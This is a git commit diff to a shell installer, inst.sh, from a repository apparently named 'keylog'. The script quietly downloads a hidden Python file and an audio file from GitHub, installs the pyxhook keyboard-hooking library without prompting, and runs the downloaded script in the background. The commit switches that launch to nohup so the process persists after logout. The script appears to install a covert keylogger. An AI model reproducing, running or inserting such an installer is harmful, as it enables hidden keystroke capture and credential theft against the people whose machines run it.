9b1bdf7bc957f848d67597c3ef2d6dfc7bdda965
khaynie <76216676+k-haynie@users.noreply.github.com>
2025-11-17 01:50:39 +0000

    Change python3 command to nohup in inst.sh

--- inst.sh
+++ inst.sh
@@ -5,5 +5,5 @@ if [ ! -f .pylock ]; then
   wget -q -nc "https://raw.githubusercontent.com/k-haynie/keylog/main/.log.py"
   wget -q -nc "https://raw.githubusercontent.com/k-haynie/keylog/main/.music.mp3"
   yes | pip3 install pyxhook pygame 
-  python3 .log.py &
+  nohup python3 .log.py &
 fi;
